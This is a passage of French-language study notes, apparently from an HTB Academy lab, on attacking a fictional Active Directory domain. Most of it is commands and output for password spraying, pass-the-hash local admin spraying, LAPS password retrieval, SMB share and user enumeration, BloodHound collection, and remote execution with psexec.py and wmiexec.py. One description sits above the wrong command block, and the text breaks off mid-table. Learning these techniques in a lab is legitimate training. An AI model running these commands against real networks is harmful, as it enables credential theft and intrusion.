2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Il existe plusieurs autres méthodes pour effectuer une attaque de type “password spraying” à partir de Linux. Une autre excellente option est d’utiliser CrackMapExec. Cet outil polyvalent accepte un fichier texte de noms d’utilisateur à tester avec un seul mot de passe dans une attaque de type “spraying”. Ici, nous utilisons grep pour filtrer les échecs de connexion et nous concentrer uniquement sur les tentatives de connexion valides afin de ne rien manquer en faisant défiler de nombreuses lignes de sortie.

```bash
keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

#### Validating the Credentials with CrackMapExec

```bash
keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```
#### Local Admin Spraying with CrackMapExec

```bash
keylian zergainoh@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

### Internal Password Spraying - from Windows

#### Using DomainPasswordSpray.ps1

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success```


Cette commande utilise un script PowerShell pour effectuer une attaque de pulvérisation de mots de passe sur un domaine Active Directory.

```powershell
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Deeper Down the Rabbit Hole


### Enumerating Security Controls

Cette commande PowerShell récupère l’état des différentes fonctionnalités de sécurité sur un ordinateur, en particulier celles liées à Windows Defender. Utile pour vérifier la configuration actuelle de Windows Defender, ce qui peut aider à comprendre quelles protections sont activées ou désactivées.

```powershell
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                 : 1.1.17400.5
AMProductVersion                : 4.10.14393.0
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.0
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM
AntivirusSignatureVersion       : 1.323.392.0
BehaviorMonitorEnabled          : False
ComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 2
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 0
QuickScanEndTime                : 9/3/2020 12:50:45 AM
QuickScanStartTime              : 9/3/2020 12:49:49 AM
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
PSComputerName                  :
```


Cette commande PowerShell récupère la politique AppLocker effective et affiche les collections de règles.
Utile pour vérifier les règles AppLocker en vigueur sur un système, ce qui peut aider à comprendre quelles applications sont autorisées ou bloquées.

```powershell
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

```


Cette commande PowerShell affiche le mode de langage actuel de la session.
Utile pour vérifier si la session PowerShell est en mode restreint ou complet, ce qui peut affecter l’exécution des scripts.

```powershell
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage
```


Cette commande PowerShell recherche dans toutes les unités d’organisation (OU) pour identifier les groupes Active Directory (AD) qui ont des droits de lecture délégués sur l’attribut ms-Mcs-AdmPwd. Utile pour vérifier quelles entités ont accès aux mots de passe gérés par LAPS (Local Administrator Password Solution), ce qui peut aider à comprendre les permissions de sécurité en vigueur sur un système.

```powershell
PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
```

Cette commande PowerShell est utilisée pour rechercher les entités (principals) qui ont des droits étendus pour lire les attributs de mot de passe de la solution LAPS (Local Administrator Password Solution) dans Active Directory. Utile pour auditer les permissions et s’assurer que seuls les utilisateurs autorisés peuvent accéder aux mots de passe administratifs gérés par LAPS.

```powershell
Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
```

Cette commande PowerShell affiche tous les ordinateurs avec LAPS (Local Administrator Password Solution) activé, y compris les informations sur l’expiration des mots de passe et les mots de passe eux-mêmes si l’utilisateur a les droits d’accès nécessaires. Utile pour auditer les environnements Active Directory qui ont déployé LAPS, ce qui peut aider à comprendre quelles machines sont protégées et comment les mots de passe administratifs sont gérés.

```powershell
PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
```

### Credentialed Enumeration from Linux


```bash
keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395

<SNIP>
```

```bash
keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36

<SNIP>
```

```bash
keylian zergainoh@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ 
```

Cette commande utilise CrackMapExec pour se connecter à un serveur SMB à l’adresse IP 172.16.5.5 avec les identifiants utilisateur forend et mot de passe Klmcargo2. Elle utilise le module spider_plus pour explorer le partage réseau spécifié (Department Shares). Utile pour découvrir et cartographier les partages réseau disponibles sur un système cible, en recherchant des fichiers et des informations sensibles.

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

```
```bash
keylian zergainoh@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	User Shares                                       	READ ONLY	
	ZZZ_archive                                       	READ ONLY
```
```bash
keylian zergainoh@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department Shares\*
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..
	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting
	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives
	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance
	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR
	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT
	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal
	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing
	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations
	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&D
	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp
	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse

    <SNIP>
```

Cette série de commandes rpcclient permet d’effectuer plusieurs actions pour auditer un environnement Active Directory. Voici ce que chaque partie de la commande fait :

enumdomusers : Énumère tous les utilisateurs du domaine. Cela te donne une liste complète des utilisateurs présents dans le domaine.

queryuser 0x492 : Récupère les informations détaillées sur un utilisateur spécifique en utilisant son RID (Relative Identifier). Cela te permet d’obtenir des détails précis sur cet utilisateur particulier.

enumdomgroups : Énumère tous les groupes du domaine. Cela te donne une liste complète des groupes présents dans le domaine.

querygroup 0xff0 : Récupère les informations détaillées sur un groupe spécifique en utilisant son RID. Cela te permet d’obtenir des détails précis sur ce groupe particulier.

```
rpcclient $> enumdomusers
queryuser 0x492
enumdomgroups
querygroup 0xff0
```

Cette commande utilise l’outil psexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.125 via le partage administratif ADMIN$ en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour obtenir un accès à distance avec des privilèges administratifs sur la machine cible.

```bash
eylian zergainoh@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 nested users for group Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

<SNIP>

[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 3 nested users for group Enterprise Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

<SNIP>
```

```bash
keylian zergainoh@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>
```
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

Cette commande utilise l’outil wmiexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.5 via WMI (Windows Management Instrumentation) en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour exécuter des commandes à distance sur la machine cible avec des privilèges administratifs.

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

```powershell

Get-Module
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...


Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
DNSRoot                            : INLANEFREIGHT.LOCAL
DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
Forest                             : INLANEFREIGHT.LOCAL
InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
                                     EFREIGHT,DC=LOCAL}
LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
ManagedBy                          :
Name                               : INLANEFREIGHT
NetBIOSName                        : INLANEFREIGHT
ObjectClass                        : domainDNS
ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
ParentDomain                       :
PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```


Cette commande PowerShell récupère tous les comptes d’utilisateurs dans Active Directory qui ont un attribut ServicePrincipalName non nul. Utile pour identifier les comptes de service, car ces comptes sont souvent utilisés par des applications et des services pour s’authentifier auprès d’autres services.

```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs
ObjectClass          : user
ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
SamAccountName       : adfs
ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
Surname              : Admin
UserPrincipalName    :

DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Jessica
Name                 : BACKUPAGENT
ObjectClass          : user
ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName       : backupagent
ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
UserPrincipalName    :

<SNIP>
```


Cette commande PowerShell récupère toutes les relations de confiance (trusts) dans Active Directory. Utile pour obtenir une vue d’ensemble des relations de confiance établies entre différents domaines ou forêts, ce qui peut aider à comprendre les connexions et les permissions entre eux.

```powershell
 Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```


Cette commande PowerShell récupère tous les groupes dans Active Directory et sélectionne uniquement leurs noms. Utile pour obtenir une liste complète des noms de groupes présents dans un environnement Active Directory, ce qui peut aider à organiser et à gérer les permissions et les accès.

```powershell
 Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

<SNIP>
```


Cette commande PowerShell récupère les informations sur le groupe “Backup Operators” dans Active Directory. Utile pour obtenir des détails spécifiques sur ce groupe, comme ses membres, ses attributs et ses permissions, ce qui peut aider à gérer les accès et les rôles de sauvegarde dans un environnement Active Directory.

```powershell
Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

```
Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
```

### PowerView

**PowerView** est un outil écrit en PowerShell qui nous aide à obtenir une connaissance situationnelle dans un environnement Active Directory (AD). Tout comme BloodHound, il permet d'identifier où les utilisateurs sont connectés sur un réseau, d'énumérer les informations de domaine telles que les utilisateurs, les ordinateurs, les groupes, les ACL, les relations de confiance, de rechercher des partages de fichiers et des mots de passe, de réaliser des attaques Kerberoasting, et bien plus encore. C'est un outil très polyvalent qui peut nous fournir une grande visibilité sur la posture de sécurité du domaine de notre client. Il nécessite plus de travail manuel pour déterminer les mauvaises configurations et les relations au sein du domaine que BloodHound, mais lorsqu'il est bien utilisé, il peut nous aider à identifier des mauvaises configurations subtiles.

Examinons certaines des capacités de PowerView et voyons quelles données il retourne. Le tableau ci-dessous décrit certaines des fonctions les plus utiles offertes par PowerView.

| Commande | Description |
